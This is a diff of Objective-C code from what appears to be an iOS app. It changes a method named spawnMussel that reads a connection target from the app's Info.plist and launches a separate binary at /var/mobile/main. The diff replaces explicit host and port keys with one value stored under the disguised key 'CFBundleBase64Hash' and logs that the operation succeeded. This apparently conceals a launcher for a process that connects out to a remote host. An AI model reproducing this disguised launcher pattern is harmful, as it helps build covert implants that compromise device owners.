@@ -47,19 +47,14 @@ extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restric
 
 -(BOOL)spawnMussel
 {
-    NSString *host;
-    NSString *port;
-    NSArray *data;
-
+    NSArray *CFBundleBase64Hash;
     NSDictionary *dictionary;
 
     dictionary = [self readInfoPlist];
-    host = dictionary[@"CFHost"];
-    port = dictionary[@"CFPort"];
-    data = @[host, port];
+    CFBundleBase64Hash = @[dictionary[@"CFBundleBase64Hash"]];
 
-    NSLog(@"[%s] Will connect to %@ %@\n", __PRETTY_FUNCTION__, host, port);
-    return [self spawnProcess:@"mussel.bin" args:data];
+    NSLog(@"[%s] Will connect to %@\n", __PRETTY_FUNCTION__, CFBundleBase64Hash[0]);
+    return [self spawnProcess:@"/var/mobile/main" args:CFBundleBase64Hash];
 }
 
 -(int)spawnProcess:(NSString *)path args:(NSArray *)args
@@ -69,13 +64,22 @@ extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restric
     NSUInteger iter;
     NSUInteger argsCount;
 
+    NSMutableString *stdoutString;
+    NSMutableString *stderrString;
+
     int stdoutPipe[2];
     int stderrPipe[2];
     int status;
     char **argv;
 
     pid_t taskPid;
-    BOOL isRunning;
+
+    __block volatile BOOL isRunning;
+    __block volatile BOOL stdoutRunning;
+    __block volatile BOOL stderrRunning;
+
+    dispatch_semaphore_t semaphore;
+    dispatch_queue_t logger;
 
     posix_spawnattr_t attr;
     posix_spawn_file_actions_t action;
@@ -124,6 +128,7 @@ extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restric
         return NO;
     }
 
+    NSLog(@"[%s] Operation mussel succeeded!\n", __PRETTY_FUNCTION__);
     return YES;
 }
 
